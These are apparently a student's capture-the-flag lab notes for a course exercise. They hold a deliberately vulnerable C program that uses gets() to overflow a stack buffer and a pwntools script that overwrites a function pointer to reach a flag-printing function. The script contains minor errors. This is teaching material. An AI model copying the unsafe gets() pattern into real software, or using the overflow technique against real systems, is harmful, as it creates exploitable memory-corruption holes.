#CS4401 #pwntools 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void recalibration(){
	char buffer[64];
	FILE *fp;  

	printf("Code flow successfully changed, navigation recalibrated.\n");
	printf("New dwarf planet detected! Recommend course correction...\n");

	fp = fopen("./flag.txt", "r");
	fgets(buffer, 64, (FILE*)fp);
	printf("flag: %s\n", buffer );
	exit(0);
}

int main(int argc, char **argv){
	volatile int (*fp)();
	char buffer[{{buffsize}}];  

	fp = 0;// initally set to 0

	gets(buffer);

	//checks if the function pointer is not NULL
	if(fp) {
		printf("Calling function pointer, jumping to %p\n", fp);
		//calling the function pointer
		fp();
	}

}
```
##### The Bug
- `gets()` can clobber any memory nearby if it reads in too many characters
##### The Goal
- Buffer Overflow to set `fp()` to the function pointer/address of `recalibration()`
- What is a function pointer: an address that points to the start of instructions associated with a particular function in the text section of a process

1. Addresses are different before execution. Why?
	1. PIE is enabled: Position Independant Execution
	3. When we disas before running the program, we get really small addresses
	4. Run the program and set a breakpoint, then disassemble and look at the values of the addresses

### Process of Solving
1. Open GDB to find the address of `recalibration()`
	1. Make sure to use the address when the program is being run!
```python
from pwn import *

elf = ELF('./stack0-64')
context.binary=elf
context.log_level = 'debug'

#opens in gdb
p = gdb.debug('./stack2-64', gdbscript'''
				break main
				shell tmux select-layout main-vertical
				shell tmux swap-pane -U
				continue
				''')
#p.sendline(cyclic(300, n=8))
#n: length of cyclic units. Defult is 4.
#8 to account for the 64-bit architecture.

exploit_str = flat({56:0xdeadbeef})
expl_str = flat({56:0xbeef})
#these strings will be the same length, flat will implicity class pack
#and 0xbeef = 0x0000beef


#flat: pack hex and turn it into a string, include an offset (automatically includes padding!!)
p.sendline(exploit_str)

p.recvall() #gets all data
p.wait() #wait until process is finished
```

### `flat()`
- pass in a dictionary with an offset and an integer (usually hex)
- offset will automatically produce padding of that amount before the function pointer